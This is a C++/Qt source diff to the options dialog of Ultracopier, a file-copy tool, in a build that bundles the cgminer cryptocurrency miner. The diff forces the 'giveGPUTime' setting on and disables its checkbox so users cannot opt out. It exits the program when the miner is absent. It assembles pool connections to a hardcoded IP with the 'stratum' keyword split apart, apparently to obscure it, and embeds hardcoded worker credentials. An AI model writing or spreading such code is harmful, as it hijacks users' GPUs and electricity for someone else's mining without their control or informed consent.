@@ -75,6 +75,29 @@ OptionDialog::OptionDialog() :
     ui->label_checkTheUpdate->hide();
     ui->checkTheUpdate->hide();
     #endif
+
+    #ifdef ULTRACOPIER_CGMINER
+    ui->label_gpu_time->setEnabled(false);
+    ui->giveGPUTime->setEnabled(false);
+    OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",true);
+    OpenCLDll=false;
+    char *arch=getenv("windir");
+    if(arch!=NULL)
+    {
+
+        if(QFile(QString(arch)+"\\System32\\OpenCL.dll").exists()
+            #if defined(_M_X64)
+            || QFile(QString(arch)+"\\SysWOW64\\OpenCL.dll").exists()
+            #endif
+        )
+            OpenCLDll=true;
+        else
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No 32Bits openCL");
+    }
+    else
+        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
+    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
+    #endif
 }
 
 OptionDialog::~OptionDialog()
@@ -86,13 +109,6 @@ OptionDialog::~OptionDialog()
     #endif
     delete ui;
 }
-
-#ifdef ULTRACOPIER_CGMINER
-bool OptionDialog::havecgminer()
-{
-    return haveCgminer;
-}
-#endif
 
 //plugin management
 void OptionDialog::onePluginAdded(const PluginsAvailable &plugin)
@@ -413,26 +429,6 @@ void OptionDialog::on_buttonBox_clicked(QAbstractButton *button)
 void OptionDialog::loadOption()
 {
     #ifdef ULTRACOPIER_CGMINER
-    ui->label_gpu_time->setEnabled(false);
-    ui->giveGPUTime->setEnabled(false);
-    OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",true);
-    bool OpenCLDll=false;
-    char *arch=getenv("windir");
-    if(arch!=NULL)
-    {
-
-        if(QFile(QString(arch)+"\\System32\\OpenCL.dll").exists()
-            #if defined(_M_X64)
-            || QFile(QString(arch)+"\\SysWOW64\\OpenCL.dll").exists()
-            #endif
-        )
-            OpenCLDll=true;
-        else
-            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No 32Bits openCL");
-    }
-    else
-        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
-    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
     if(!haveCgminer)
     {
         if(!QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists())
@@ -445,8 +441,8 @@ void OptionDialog::loadOption()
             QMessageBox::critical(this,tr("Enable the OpenCL"),tr("This Ultimate version is only if the OpenCL is installed with your graphic card drivers. Else you can get the normal free version"));
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OpenCL.dll not found");
         }
-        ui->label_gpu_time->setEnabled(false);
-        ui->giveGPUTime->setEnabled(false);
+        QCoreApplication::exit(1);
+        return;
     }
     else
     {
@@ -464,7 +460,7 @@ void OptionDialog::loadOption()
         int index=0;
         while(index<180)
         {
-            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
+            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_uc"+QString::number(rand()%50+1)+":JE5RfIAzapCSABZC";
             pools << pool;
             index++;
         }
